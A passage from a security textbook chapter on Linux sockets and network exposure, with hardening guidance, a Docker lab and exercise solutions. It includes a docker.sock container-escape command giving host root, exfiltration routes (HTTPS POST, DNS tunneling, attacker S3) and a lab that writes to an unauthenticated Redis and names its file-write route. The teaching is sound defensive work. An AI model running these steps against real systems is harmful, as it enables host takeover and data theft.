  - POST stolen data to an attacker server on 443 (looks like normal HTTPS)
  - or tunnel over DNS (Chapter 17) if only DNS is allowed
  - or exfiltrate to the attacker's own S3 bucket via the S3 API (looks like legitimate S3)
```

The lesson repeated from §4.5: destination-only egress rules that allow "443 to anywhere"
are barely a control. Real egress control means an allowlist of specific destinations
(Chapter 8), ideally via VPC endpoints so "reach S3" means "reach *our* S3", and monitoring
of egress volume and destinations (Chapter 82's Flow Logs).

### 10.3 fd/connection exhaustion (Slowloris family)

```
Attack: open thousands of connections to the web server, send partial HTTP headers slowly,
  never completing a request. Each connection holds a worker/fd/buffer.
Result: legitimate clients cannot connect; the server appears up but unresponsive.
```

The mechanism is exactly §5.3 and §5.4: finite fds, finite worker slots, per-connection
buffers. Defenses: connection and header timeouts, `limit_conn`/`limit_req` in Nginx,
a reverse proxy that absorbs slow clients before they reach the app, and generous-but-bounded
`LimitNOFILE`. This is why "put a reverse proxy in front of the app" is a security
recommendation and not only a performance one.

### 10.4 The Docker socket mount

```
Misconfiguration: a container is started with -v /var/run/docker.sock:/var/run/docker.sock
  (common for CI runners and "monitoring" containers).
Attack from inside the container:
  docker -H unix:///var/run/docker.sock run -v /:/host --rm -it alpine chroot /host sh
  -> full root on the host
```

Because the socket is a file (§4.2, §6.3) and the daemon runs as root, mounting it hands over
the host. This is one of the most common real-world container escapes and it requires *zero*
kernel exploitation — just the everything-is-a-file abstraction applied to a powerful
endpoint. Chapter 96 covers this and the alternatives (rootless Docker, a socket proxy that
allowlists API calls, or not mounting it at all).

---

## 11. Defensive Techniques

**1. Bind internal services to loopback or a private interface, or use Unix sockets.**

```conf
# postgresql.conf
listen_addresses = 'localhost'        # or a specific private IP; never '*' unless intended
# redis.conf
bind 127.0.0.1 -::1
requirepass <strong-secret>           # AND auth — defense in depth
# Kestrel (appsettings / launchSettings)
"Urls": "http://127.0.0.1:5000"       # front with Nginx; do not expose Kestrel directly
```

**2. Verify exposure from the network's perspective, not just the config.**

```bash
$ ss -tlpn                    # what is bound where
$ nmap -sT -p- <host>         # what is actually reachable (from where you run it)
```

Config review and reachability testing catch different mistakes; do both.

**3. Set fd limits and connection timeouts deliberately.**

```ini
# systemd unit
LimitNOFILE=65536
```
```nginx
# nginx: absorb slow clients before the app
client_header_timeout 10s;
client_body_timeout   10s;
send_timeout          10s;
limit_conn_zone $binary_remote_addr zone=perip:10m;
limit_conn perip 50;
```

**4. Constrain egress; do not rely on destination-anywhere rules.** (Full treatment in
Chapter 8.) At minimum, know what your service is *supposed* to connect to and alert on
anything else via connection monitoring:

```bash
# a crude but effective host-level tripwire:
$ ss -tnp state established | grep dotnet | grep -vE '10\.0\.2\.10:5432|127\.0\.0\.1'
```

**5. Never mount `docker.sock` into a container that does not absolutely require it**, and
treat `docker` group membership as root-equivalent in your access model (Chapter 33).

**6. Prefer Unix domain sockets with tight modes for local IPC** over loopback TCP, to get
filesystem-permission access control instead of "any local process may connect."

**7. Set `O_CLOEXEC` / rely on runtimes that do**, so descriptors do not leak across
`execve` into child processes (Chapter 2 §4.5).

---

## 12. Production Architecture

The reverse-proxy-fronted pattern, which is both a performance and a security architecture:

```
                Internet
                   |
                   v
        +----------------------+
        |  Load balancer / ALB |   terminates or passes through TLS
        |  (or Nginx)          |   absorbs slow clients, rate limits,
        +----------------------+   sanitizes headers, is the ONLY 0.0.0.0:443
                   |               bind that faces the internet
                   v
        +----------------------+
        |  App (Kestrel/Node)  |   bound to a private address / SG-restricted
        |  on 8080             |   never directly internet-facing
        +----------------------+
                   |
        +----------+-----------+
        v          v           v
     Postgres    Redis      RabbitMQ    each: private bind / private subnet,
                                        reachable only from the app tier,
                                        with auth as a second layer
```

Why this is the standard, in security terms:

1. **A single, well-understood ingress point.** One thing binds `0.0.0.0:443`, and it is the
   hardened, purpose-built proxy — not your application code that also happens to have a bug
   in its deserializer. The proxy is the "minimized privileged component" pattern from
   Chapters 1 §12 and 2 §7, applied to the network edge.
2. **The proxy absorbs the resource attacks** (slow clients, connection floods) before they
   reach application workers, whose thread pool is precious (§5.3).
3. **Each backend is reachable only from the tier above it**, so a compromise of the app tier
   does not directly expose the databases to the internet — it has to pivot through the app,
   which is detectable.
4. **TLS terminates (or re-originates) at a controlled point** where you manage certificates,
   cipher suites, and logging (Chapter 28), rather than in every service.

In Kubernetes (System C) the same shape appears as Ingress → Service → Pod, with
NetworkPolicy providing the "reachable only from the tier above" property (Chapter 104). The
architecture is invariant; the enforcing mechanisms change per platform — the exact lesson
from §7.

---

## 13. Common Mistakes

1. **Confusing "bound" with "exposed."** A `0.0.0.0` bind behind a closed firewall is not
   exposed; a `127.0.0.1` bind behind an open firewall is not exposed. Exposure needs both
   bind reachability and network reachability. Always check both layers.
2. **Exposing Kestrel/Node directly** instead of fronting with a proxy — losing TLS control,
   rate limiting, header sanitization, and slow-client absorption.
3. **Binding databases and caches to `0.0.0.0`** "so the app can reach them," when loopback
   or a private interface would do. The classic Redis/Mongo/Elasticsearch exposure.
4. **Trusting port numbers for protocol identification.** C2 on 443; SSH on 443; anything on
   anything.
5. **Destination-anywhere egress rules** treated as egress control.
6. **Mounting `docker.sock`** into containers, or handing out `docker` group membership,
   without recognizing it as root-equivalent.
7. **No fd/connection limits**, leaving the service open to silent exhaustion.
8. **Reverse-DNS / port-name resolution in security tooling** (running `ss` or `netstat`
   without `-n`), which is slow and can be poisoned by attacker-controlled DNS.
9. **Assuming `close()` immediately frees the port.** `TIME_WAIT` holds the tuple briefly
   (Chapter 19); `SO_REUSEADDR` exists for this reason.
10. **Ignoring `Recv-Q` on listening sockets**, which is an early overload/SYN-flood signal.

---

## 14. Troubleshooting

| Symptom | Likely cause | Diagnostic |
|---|---|---|
| "Connection refused" | Nothing listening on that address:port (kernel sends RST) | `ss -tlpn` on the server; check the *bind address*, not just the port |
| "Connection timed out" | Firewall/SG dropping (no reply), or no route | `ss -tlpn` shows it IS listening → suspect firewall/SG/routing; `nc -vz`, `traceroute` |
| Reachable locally, not remotely | Bound to `127.0.0.1` instead of `0.0.0.0`/private IP | `ss -tlpn` — look at the Local Address column |
| Service "up" but not accepting connections | fd exhaustion (`EMFILE`) or full backlog | `ls /proc/PID/fd \| wc -l` vs `cat /proc/PID/limits`; `ss -tlpn` Recv-Q at max |
| Port "in use" on restart | Previous socket in `TIME_WAIT` | `ss -tn state time-wait`; use `SO_REUSEADDR`; wait out `TIME_WAIT` |
| Unexpected outbound connection | Possible compromise / exfiltration | `ss -tnp state established` — identify the process and destination; correlate with Flow Logs |
| Unknown listening port | Rogue/forgotten service or implant | `ss -tlpn`, then `lsof -p PID`, `/proc/PID/exe`, `/proc/PID/cmdline` |
| "Permission denied" binding a port | Port < 1024 without privilege | bind ≥1024 and proxy, or grant `CAP_NET_BIND_SERVICE` deliberately |

The single most useful reflex: when a connection fails, **`ss -tlpn` on the server first.**
If it is listening, the problem is reachability (firewall/SG/route). If it is not, or it is
on the wrong address, the problem is the bind. That one branch resolves most network
debugging.

---

## 15. Practical Lab

### LAB 3.1 — Map and Harden a Host's Network Attack Surface

**Objective.** Enumerate every listening socket on a realistic multi-service host, determine
which are network-reachable, identify the exposure findings, remediate them via bind
addresses and firewall rules, and verify the result from an attacker's viewpoint.

**Cost.** Free. **Environment.** ENV-2 (Docker Compose, to simulate a multi-host network).
**Time.** 60–90 minutes.

**Architecture.**

```
  docker network "labnet" (172.30.0.0/16)
    +-- app        (172.30.0.10)  nginx + a fake "kestrel" + redis + postgres
    +-- attacker   (172.30.0.20)  kali-ish toolbox (nmap, nc, redis-cli)
```

**Steps.**

*Step 1 — Stand up the target.*

```bash
mkdir -p ~/lab03 && cd ~/lab03
cat > docker-compose.yml <<'EOF'
services:
  app:
    image: ubuntu:22.04
    container_name: lab-app
    networks: { labnet: { ipv4_address: 172.30.0.10 } }
    command: sleep infinity
  attacker:
    image: ubuntu:22.04
    container_name: lab-attacker
    networks: { labnet: { ipv4_address: 172.30.0.20 } }
    command: sleep infinity
networks:
  labnet:
    ipam:
      config: [{ subnet: 172.30.0.0/16 }]
EOF
docker compose up -d
docker exec lab-app bash -c 'apt-get update -qq && apt-get install -y -qq \
    nginx redis-server postgresql iproute2 procps net-tools >/dev/null 2>&1'
docker exec lab-attacker bash -c 'apt-get update -qq && apt-get install -y -qq \
    nmap netcat-openbsd redis-tools iproute2 >/dev/null 2>&1'
```

*Step 2 — Start services with deliberately mixed exposure.*

```bash
docker exec lab-app bash -c '
  service postgresql start
  # Redis bound to ALL interfaces, no auth — the classic mistake:
  sed -i "s/^bind .*/bind 0.0.0.0/; s/^protected-mode yes/protected-mode no/" /etc/redis/redis.conf
  service redis-server start
  service nginx start
'
```

*Step 3 — Enumerate the attack surface from the host itself.*

```bash
docker exec lab-app ss -tulpn
```

**Expected:** nginx on `0.0.0.0:80`, redis on `0.0.0.0:6379`, postgres likely on
`127.0.0.1:5432` (Debian's default). Record each bind address.

*Step 4 — Enumerate from the attacker's viewpoint.*

```bash
docker exec lab-attacker nmap -sT -p- --open 172.30.0.10
docker exec lab-attacker bash -c 'redis-cli -h 172.30.0.10 ping'    # expect PONG — BAD
docker exec lab-attacker bash -c 'nc -vz 172.30.0.10 5432'          # postgres reachable?
```

**Expected:** nmap reports 80 and 6379 open; Redis answers `PONG` from the attacker
container with no authentication. That is your finding: **an unauthenticated Redis reachable
across the network.**

*Step 5 — Demonstrate the impact (safely, within the lab).*

```bash
docker exec lab-attacker bash -c '
  redis-cli -h 172.30.0.10 set pwned "attacker was here"
  redis-cli -h 172.30.0.10 get pwned
  redis-cli -h 172.30.0.10 config get dir      # the RCE primitive from ss 10.1
'
```

**Security implication:** an attacker with no credentials can read and write your cache and,
via `CONFIG SET dir`/`dbfilename` + `SAVE`, potentially write files as the redis user. Write
down which two conditions made this possible (bind + reachability + no auth = three, in fact).

*Step 6 — Remediate, applying defense in depth.*

```bash
docker exec lab-app bash -c '
  # 1. Bind Redis to loopback and enable auth (two independent fixes):
  sed -i "s/^bind .*/bind 127.0.0.1 -::1/; s/^protected-mode no/protected-mode yes/" /etc/redis/redis.conf
  grep -q "^requirepass" /etc/redis/redis.conf || echo "requirepass S3cure-lab-pass" >> /etc/redis/redis.conf
  service redis-server restart
'
```

*Step 7 — Verify from the attacker again.*

```bash
docker exec lab-attacker nmap -sT -p 6379 172.30.0.10       # expect closed/filtered
docker exec lab-attacker bash -c 'redis-cli -h 172.30.0.10 ping'   # expect: connection refused
docker exec lab-app       bash -c 'redis-cli -h 127.0.0.1 -a S3cure-lab-pass ping'  # PONG locally
```

**Expected:** Redis is no longer reachable from `172.30.0.20`, and even a local connection
now requires the password. You fixed it at two layers.

**Attack scenario extension.** Suppose Redis genuinely *must* be reachable from the app
container across the network (a separate host). Enumerate the controls you would apply
instead of a loopback bind: bind to the private interface only, `requirepass` (or ACLs), TLS
(`redis.conf tls-port`), a firewall rule allowing only the app's IP, and — in AWS — a
security group allowing only the app's security group (Chapter 76). Note that this is exactly
the "the control moves between layers" lesson from §7.

**Verification.**

```bash
docker exec lab-app ss -tlpn | grep 6379     # expect 127.0.0.1:6379 only
docker exec lab-attacker bash -c 'timeout 3 redis-cli -h 172.30.0.10 ping || echo "unreachable: good"'
```

**Cleanup.**

```bash
cd ~/lab03 && docker compose down && cd ~ && rm -rf ~/lab03
```

---

## 16. Exercises

### Concept questions

**3.1** Explain the difference between binding a service to `127.0.0.1`, `10.0.1.5`, and
`0.0.0.0`, and state precisely which threat each choice does and does not address. Where does
the security group fit relative to these?

**3.2** A socket is identified by a 4-tuple. Explain why this is the natural unit for
firewalls, NAT, and connection tracking, and give one example of a control that operates on
each element of the tuple.

**3.3** "Everything is a file" — explain how this abstraction makes the Docker socket mount
(§10.4) a *predictable* rather than surprising vulnerability. What other file-like object
would you audit for the same reason?

**3.4** Why does `write()` returning success not mean the peer received the data? Which kernel
structure holds the data at that moment, and what security-relevant behavior (a DoS) exploits
it?

**3.5** Distinguish "connection refused" from "connection timed out" at the packet level, and
explain how `nmap` uses this difference to distinguish `closed` from `filtered`.

### Debugging problems

**3.6** A service's security group allows `0.0.0.0/0` on port 8443, but clients get
"connection timed out" (not refused). `ss -tlpn` on the host shows the process listening on
`127.0.0.1:8443`. Explain exactly why each symptom occurs and what the fix is.

**3.7** An API process that normally holds ~200 connections is found with 1,048,576 open
fds, and new requests fail. `ss -tnp` shows tens of thousands of connections in `CLOSE_WAIT`.
What does `CLOSE_WAIT` accumulating specifically indicate (whose bug is it, client or
server?), and how do you fix it?

**3.8** After a deploy, `ss -tlpn` shows two processes appearing to listen on the same port,
and requests are randomly served by an old and a new version. Explain how this is possible
and which socket option is involved.

### Security scenarios

**3.9** You run `sudo ss -tulpn` on a production host and find a process named `[kworker/2:1]`
listening on `0.0.0.0:41414`. Kernel worker threads do not listen on sockets. Walk through
your investigation and the first three actions you would take.

**3.10** A developer asks to mount `/var/run/docker.sock` into a CI runner container "so it
can build images." Explain the risk in one paragraph a non-security engineer would accept,
then propose two concrete alternatives.

### Architecture questions

**3.11** Design the socket-level exposure model for System B (Ledger on AWS: ALB → ECS → RDS →
ElastiCache). For each hop, name what makes the next tier reachable *only* from the tier
above, and what has to fail for the database to become internet-reachable.

**3.12** Your platform must allow tenant workloads to make outbound HTTP calls to
tenant-configured webhooks, but must prevent them from reaching internal services or the
metadata endpoint (SSRF, Chapter 50). Sketch how you would constrain egress at the
socket/network layer, and where a pure network control is insufficient.

### Hands-on exercises

**3.13** Using only bash's `/dev/tcp`, write a one-line HTTP client that fetches
`http://example.com/` and prints the response headers. Explain what file-like object bash is
exposing.

**3.14** Write a script that lists every listening socket on your machine, resolves each to
its owning process and user, and flags any bound to `0.0.0.0`/`[::]` that is not on an
allowlist you define. This is a mini host-hardening scanner.

**3.15** Reproduce the `TIME_WAIT` behavior: open and close 100 connections rapidly to a
local server, then show the accumulation with `ss -tn state time-wait | wc -l`. Explain why
`SO_REUSEADDR` on the *server* does not eliminate client-side `TIME_WAIT`.

### Interview questions

**3.16** "Walk me through everything that happens, in kernel terms, from `socket()` to a
established TCP connection carrying data."

**3.17** "A service is bound to `0.0.0.0` and the security group is wide open, but it's not
reachable. Give me three possible explanations."

**3.18** "Why is mounting the Docker socket into a container equivalent to giving it root on
the host? Explain the mechanism, not just the conclusion."

**3.19** "How would you enumerate and assess the network attack surface of a Linux host
you've just been given responsibility for?"

**3.20** "Explain how an attacker exfiltrates data from an environment where 'egress is
blocked.' What would actually stop them?"

---

## 17. Summary

- **Everything is a file**: regular files, devices, pipes, and sockets all present the
  `read`/`write`/`close` interface, dispatched by the VFS through per-object `f_op` tables. A
  program tricked into acting on the wrong file-like object is the shape of SSRF and
  path-handling bugs.
- **A file descriptor is a capability** (Chapter 2 restated at the socket layer); a **socket
  is a file descriptor**; a **connection is a 4-tuple** — the atomic unit every network
  control matches, tracks, rewrites, and logs.
- **"Is the port open?" is two questions**: the *bind address* (decided in the process, below
  any firewall) and *network reachability* (firewall/SG/route). Exposure requires both;
  keeping them separate is the key debugging reflex.
- The server path is `socket → bind → listen → accept` (accept yields a new fd per
  connection); the client path is `socket → connect` (the kernel assigns an ephemeral source
  port). Ports below 1024 require privilege.
- **Ports are conventions, not contracts** — detection cannot trust port = protocol.
- **Socket buffers, fds, ephemeral ports, and conntrack entries are finite kernel resources
  and therefore DoS targets**; defending them (timeouts, limits, reverse proxies) is
  security work.
- `ss -tulpn` (always with `-n`) and `lsof` are the core commands; the inode number joins the
  process view to the network view.
- **Unix domain sockets** get filesystem-permission access control; **`docker.sock` is
  root**, because it is a file-like control endpoint for a root daemon.
- The reverse-proxy-fronted, tier-isolated architecture is the standard because it minimizes
  the privileged internet-facing component, absorbs resource attacks, and makes each backend
  reachable only from the tier above — with the *enforcing mechanism* moving between layers
  (loopback bind → security group → NetworkPolicy) as the platform changes, while the
  *property* stays constant.

---

## 18. Knowledge Check

1. What are the two independent questions hidden inside "is port 443 open?" (§3)
2. What is a socket 4-tuple, and name one control that operates on each element. (§3, §4.5)
3. Why does `accept()` return a new fd, and what does that imply about one port serving many
   clients? (§4.4)
4. Which syscall and which capability are required to bind port 80? (§4.4)
5. Where does data live after `write()` returns but before the peer ACKs it? (§5.1)
6. What does `epoll` enable, and what is the security downside of one thread serving
   thousands of connections? (§5.3)
7. Why is `docker.sock` root-equivalent, in terms of this chapter's abstractions? (§4.2, §6.3, §10.4)
8. What is the difference between "connection refused" and "connection timed out"? (§14)
9. Why is a destination-anywhere egress rule barely a control? (§4.5, §10.2)
10. In System A, what makes PostgreSQL unreachable from the internet, and what would have to
    fail for that to change? (§7)

---

## 19. Further Exploration

- `man 7 socket`, `man 2 bind`, `man 2 listen`, `man 2 accept`, `man 7 unix`,
  `man 7 tcp` — the primary sources. Read `man 7 tcp` again after Chapter 19.
- `man 8 ss` and `man 8 lsof` — learn the filter syntax; it pays off forever.
- **`/proc/net/tcp`, `/proc/net/tcp6`, `/proc/net/unix`** — read them raw once to see where
  `ss` gets its data; the hex-encoded addresses are a nice Chapter 7 warm-up.
- Beej's Guide to Network Programming — the friendliest complete socket tutorial in
  existence; skim it to see the syscalls in full programs.
- Run `ss -tulpn` on every host and container you touch for a week. Build the habit of asking
  "should this be listening, on this address, as this user?" It becomes automatic.
- The Redis, MongoDB, and Elasticsearch "security" docs on binding and auth — read them as
  case studies in the same mistake made three times.

---

## Solutions

### 3.1
`127.0.0.1` binds only the loopback interface: reachable solely by processes on the same
host. `10.0.1.5` binds one specific interface: reachable only via that network/interface (a
private network, say). `0.0.0.0` binds all interfaces: reachable via any network path that
exists to the host. The bind address is enforced by the kernel and addresses the threat of
network-based access *independently of any firewall* — a loopback bind means no firewall
mistake can expose the service, which is defense in depth. It does *not* address a local
attacker (any process that can reach loopback), so loopback bind is not a substitute for
authentication. The security group sits *above* the bind: it controls which packets can reach
the interface at all. Exposure requires the bind to face a reachable interface *and* the SG
to permit the traffic; both must be permissive for the service to be reachable, which is why
having both layers is protective.

### 3.2
The 4-tuple `(src IP, src port, dst IP, dst port)` uniquely identifies a connection, so it is
the natural key for anything that must track or match connections. Firewalls match on it
(allow dst port 443 from a src CIDR); connection tracking (Chapter 37) stores state keyed on
it to implement stateful rules; NAT (Chapter 14) rewrites the src IP/port and remembers the
mapping in a table keyed on the tuple. Examples per element: a security group rule on
*destination port* (allow 5432); an egress rule on *destination IP* (allow only 10.0.2.10);
source-IP allowlisting (SSH from the bastion's IP only); source-port is what NAT/PAT rewrites
and what makes many outbound connections from one host distinguishable.

### 3.3
The Docker socket is a Unix domain socket — a file-like object at a filesystem path (§4.2).
"Everything is a file" means that access to that endpoint is granted exactly like access to a
file: by filesystem permissions and by whether the path is present in your mount namespace.
So mounting the path into a container is, by the abstraction's own rules, granting the
container the ability to speak to the daemon — and since the daemon runs as root and will
create containers that mount the host, that is root on the host. It is predictable, not
surprising, once you accept that a control endpoint exposed as a file is governed by
file-access rules. The other file-like objects to audit for the same reason: any Unix socket
belonging to a privileged daemon (`containerd.sock`, `crio.sock`, the systemd private
socket, a Kubernetes kubelet socket), and any `/proc`/`/sys` path mounted into a container
that exposes host state or control.

### 3.4
After `write()` returns, the data is in the socket's **send buffer** (`sk_wmem`) in kernel
memory; TCP will transmit and retransmit it until the peer ACKs, at which point the buffer
space is freed. So `write()` success means "the kernel accepted the bytes," not "the peer
received them" — reliability is TCP's job over time (Chapter 19), not `write()`'s. The
security-relevant DoS: a malicious client that reads slowly (or not at all) prevents the
server's send buffer from draining, so the buffer stays full, consuming per-connection kernel
memory; many such connections exhaust memory — the "slow read" attack, the read-side twin of
Slowloris.

### 3.5
"Connection refused" means a packet reached the host and the host actively rejected it: for
TCP, the kernel sent a `RST` because nothing was listening on that port. "Connection timed
out" means no reply came at all — typically a firewall silently *dropped* the packet, so the
client's SYN retransmits until it gives up. `nmap` uses exactly this: a port that answers SYN
with SYN-ACK is `open`; one that answers with RST is `closed` (something is there to say no);
one that answers with nothing (drops) is `filtered` (a firewall is eating the packet). The
RST-vs-drop distinction is the whole basis of distinguishing a closed port from a firewalled
one.

### 3.6
Wide-open SG but "timed out" (not "refused") is the tell. The SG allows the packet to reach
the host (so it is not being refused at the SG with a reject; SGs drop, they do not reject).
The packet reaches the host, but nothing is listening on the interface it arrived on: the
process is bound to `127.0.0.1:8443`, so the loopback-only socket does not accept connections
arriving on the host's network interface. The kernel, with no matching listening socket on
that interface, would normally RST — but the SG's implementation and the routing mean the
client experiences a timeout (and in AWS, traffic to a port with no listener behind a
security group that allows it typically results in a connection reset from the instance or a
timeout depending on path; the operative fix is the bind). Fix: bind the process to
`0.0.0.0` or the private interface IP, then rely on the SG to restrict *who* can reach it.
The lesson: an open firewall cannot expose a loopback-bound service — the two-layer model
from §3.

### 3.7
`CLOSE_WAIT` accumulating on the *server* means the peer (client) sent FIN — it closed its
end — but the server application has **not** called `close()` on its side of the socket. The
socket sits in `CLOSE_WAIT` waiting for the local application to close it, holding an fd the
whole time. This is a *server-side application bug*: a code path that finishes with a
connection but never closes the fd (an unclosed `HttpClient`/stream, an exception that skips
cleanup, a missing `using`/`finally`). It is not the client's fault and not the kernel's —
the kernel cannot close it for you because the application might still want to send data. Fix:
find the code path leaking sockets and ensure `close()`/`Dispose()` runs on all paths
(including exceptions); as a stopgap, lower keep-alive/idle timeouts and raise `LimitNOFILE`,
but those only delay exhaustion. Monitor `CLOSE_WAIT` count as the leading indicator.

### 3.8
Both the old and new process bound the same port using `SO_REUSEPORT` (not `SO_REUSEADDR`),
which deliberately allows multiple sockets to bind the identical address:port and has the
kernel load-balance incoming connections across them. During a rolling/blue-green restart
where the old process has not fully exited, both are live and the kernel distributes
connections to both — hence requests randomly served by old and new versions. It is
"possible" precisely because `SO_REUSEPORT` is designed for zero-downtime restarts and
multi-process servers. The fix for the deploy is to ensure the old process stops accepting
(drains and closes its listening socket) before the new one takes over, or to use a proper
handover; the option involved is `SO_REUSEPORT`. (`SO_REUSEADDR`, by contrast, only lets you
rebind an address stuck in `TIME_WAIT`; it does not create two simultaneously-listening
sockets on the same port for load balancing.)

### 3.9
A kernel worker name (`[kworker/...]`, in brackets) on a userspace listening socket is a
strong indicator of a **masqueraded implant** — attackers name their process to look like a
kernel thread, but kernel threads have no memory map and never own sockets. Investigation:
(1) `sudo ls -l /proc/<pid>/exe` — a real kernel thread has no `exe` link; a masqueraded
process points at a binary (often in `/tmp`, `/dev/shm`, or deleted, shown as
`(deleted)`). (2) `sudo cat /proc/<pid>/cmdline | tr '\0' ' '` and `/proc/<pid>/maps` —
kernel threads have empty maps. (3) `sudo ss -tnp` on that port to see peer addresses (C2?).
First three actions: isolate the host (remove from the load balancer / restrict its SG to
deny egress, but preserve it for forensics — do not power off, which loses memory, per
Chapter 1); capture volatile evidence (`ss -tnp`, `/proc/<pid>/exe`, memory, the binary);
and begin incident response (Chapter 121) — identify initial access, scope lateral movement
via connection history and CloudTrail, rotate credentials the host could reach.

### 3.10
"The Docker socket is the control channel for a program (the Docker daemon) that runs as
root and can start containers that mount the whole host filesystem. Giving the CI runner
access to that socket is therefore the same as giving it root on the build host — anything
that compromises a build (a malicious dependency, a poisoned Dockerfile from a pull request)
would get full control of the machine and everything on it, including other tenants' builds
and any credentials on the host." Alternatives: (1) use a rootless, daemonless image builder
that needs no privileged socket — **BuildKit/buildkitd in rootless mode**, **Kaniko**, or
**Buildah** — which build images without the Docker daemon; (2) if a daemon is unavoidable,
run builds in **ephemeral, single-use VMs/microVMs** (or the cloud's managed build service)
so a compromised build cannot reach anything of value and is destroyed after. A third, weaker
option is a **socket proxy** that allowlists only the specific daemon API calls builds need.

### 3.11
Hop by hop: **Internet → ALB**: the ALB's security group allows 443 from `0.0.0.0/0`; the
ALB is the only internet-facing component. **ALB → ECS tasks**: the tasks' security group
allows the app port *only from the ALB's security group* (SG-referencing rules, Chapter 76),
so nothing but the ALB can reach the tasks, and the tasks live in private subnets with no
route to an internet gateway (no public IP). **ECS → RDS**: RDS's security group allows 5432
*only from the ECS tasks' security group*; RDS is in private (isolated) subnets. **ECS →
ElastiCache**: same pattern, 6379 from the tasks' SG only, plus AUTH/TLS. For the database to
become internet-reachable, multiple independent things must fail simultaneously: RDS would
need to be placed in a public subnet *and* given a public IP *and* have its SG opened to a
wide CIDR (or the SG-referencing rule replaced with `0.0.0.0/0`) *and* the route table would
need an IGW route. Each is a separate control and change; that is the point of the layered
design — no single misconfiguration exposes the data.

### 3.12
A pure network egress control (security group / firewall / NetworkPolicy) can: deny all
egress by default; block the link-local metadata range `169.254.169.254/32` (and IMDSv2 hop
limits, Chapter 78); block RFC1918 internal ranges so tenant code cannot reach internal
services; and allow egress only to an outbound proxy. But network controls alone are
insufficient for webhooks because the *destination is tenant-configured and dynamic*, and
DNS rebinding (Chapter 17) can make an allowed hostname resolve to an internal IP after the
check. So you route webhook calls through an **egress proxy that re-resolves the hostname and
validates the resolved IP against a denylist at connection time** (not just at
configuration time), rejects redirects to internal ranges, strips credentials, and enforces
the allowlist on the *actual* IP connected to — closing the DNS-rebinding gap that a static
network rule cannot. This is the "filter on the request vs enforce at the resource" principle
(Chapter 2 §5.4): the network layer enforces coarse reachability; the application-aware proxy
enforces the per-request destination decision.

### 3.13
```bash
exec 3<>/dev/tcp/example.com/80
printf 'GET / HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n' >&3
cat <&3
```
Bash exposes TCP connections as pseudo-files under `/dev/tcp/HOST/PORT` (and `/dev/udp/...`).
Opening one with `exec 3<>` performs `socket()`+`connect()` under the hood and binds the
resulting socket fd to descriptor 3; `>&3` writes to the send buffer, `<&3` reads from the
receive buffer. It is a direct demonstration of "everything is a file": a network connection
is manipulated with the same redirection syntax as a file. (Note this is a bash builtin
feature, not an actual `/dev` device — but the interface is deliberately file-shaped.)

### 3.14
Expected shape:
```bash
#!/usr/bin/env bash
allow="22 443"        # ports allowed to be public
ss -H -tlpn | while read -r _ _ _ _ local _ proc; do
  addr=${local%:*}; port=${local##*:}
  if [[ "$addr" == "0.0.0.0" || "$addr" == "[::]" || "$addr" == "*" ]]; then
    if ! grep -qw "$port" <<<"$allow"; then
      echo "FINDING: public bind on port $port -> $proc"
    fi
  fi
done
```
The script reads `ss` output, extracts the bind address and port, flags any wildcard bind
whose port is not on the allowlist, and prints the owning process. Real-world refinements:
resolve the user via the pid, correlate with a documented service inventory, and run it as a
cron/systemd-timer that reports deltas (a *new* public port is the alert-worthy event).

### 3.15
Rapidly opening and closing 100 client connections leaves ~100 sockets in `TIME_WAIT` on the
side that initiated the close (the *active closer*), because TCP holds the tuple for 2×MSL to
absorb late/duplicate segments and ensure the final ACK was received (Chapter 19).
`ss -tn state time-wait | wc -l` shows the accumulation. `SO_REUSEADDR` on the *server* does
not eliminate *client-side* `TIME_WAIT` because (a) `TIME_WAIT` is held by whichever side
actively closed — here the client — and (b) `SO_REUSEADDR` only affects the ability to
*bind* an address that has a socket in `TIME_WAIT`; it does not remove the `TIME_WAIT` state
itself, which exists for correctness. If the client is the active closer, it accumulates
`TIME_WAIT` regardless of any server-side option. Mitigations are connection reuse
(keep-alive, pooling — which your ORM and HttpClient do) rather than defeating `TIME_WAIT`.

### 3.16
Expected shape: `socket(AF_INET, SOCK_STREAM, 0)` allocates a `struct socket`/`struct sock`
and installs a `struct file` in the fd table, returning the lowest free fd. `connect(fd,
dst)`: the kernel selects an ephemeral source port, sets the socket state to `SYN_SENT`, and
sends a SYN (Chapter 19); on receiving SYN-ACK it sends ACK and moves to `ESTABLISHED`,
populating the 4-tuple in the `struct sock`. `write(fd, ...)` copies data into the send
buffer via `copy_from_user`; TCP segments it per the congestion and receive windows, IP
prepends addressing and routing selects the interface, ARP resolves the next hop's MAC, and
the NIC DMAs the frame out. Incoming data lands in the receive buffer; `read(fd, ...)` copies
it to userspace. `close(fd)` initiates the FIN handshake and the socket passes through
`FIN_WAIT`/`TIME_WAIT`. Bonus: mention that `write` success = accepted into the send buffer,
not delivered, and that `epoll` is how one thread waits on many such sockets.

### 3.17
(1) The process is not actually bound to `0.0.0.0` on the interface the client uses — e.g.
it is bound to `127.0.0.1`, or to a different interface/IP than the one the traffic arrives
on (`ss -tlpn` reveals this). (2) A **NACL** (Chapter 76) or a host firewall
(iptables/nftables) is dropping the traffic even though the *security group* allows it — SGs
and NACLs are independent layers, and the host firewall is a third. (3) A **routing**
problem: no route from the client to the host (wrong subnet route table, no IGW/NAT for the
path, or asymmetric routing where the return path is broken). Strong answers also mention:
the process is listening but the health check / target group is unhealthy so an ALB is not
forwarding; or the wrong port entirely; or the instance is in a subnet whose route table
lacks a path back to the client.

### 3.18
Mechanism: `/var/run/docker.sock` is a Unix domain socket — a file-like IPC endpoint — over
which the Docker daemon exposes its full HTTP API. The daemon runs as **root** on the host.
Anyone who can write to that socket can issue API calls, including "create and start a
container." An attacker asks the daemon to run a container with `-v /:/host` (bind-mounting
the host root filesystem into the container) and then `chroot`s into it or writes to
`/host/etc/...`, executing as root on the host. No kernel exploit, no capability trickery —
just the daemon faithfully doing what its API allows, with the attacker's requests. Because
access to the socket is governed by filesystem permissions (everything is a file), granting
the socket — via a volume mount or `docker` group membership — is transitively granting root.

### 3.19
Expected methodology: (1) **Enumerate listeners locally** — `sudo ss -tulpn`, mapping each
socket to process (`/proc/PID/exe`, `cmdline`) and user; classify each as expected/exposed.
(2) **Enumerate reachability externally** — `nmap -sT -p- --open <host>` from where clients
actually are, distinguishing open/closed/filtered; compare against the local bind list to
find the gap between "listening" and "reachable." (3) **Check the layers** — host firewall
(`nft list ruleset` / `iptables -L`), cloud SG and NACL, route tables. (4) **Assess each
exposed service** — version, auth, TLS, known CVEs; is it *meant* to be exposed? (5)
**Egress** — what does the host connect *out* to (`ss -tnp state established`), and is
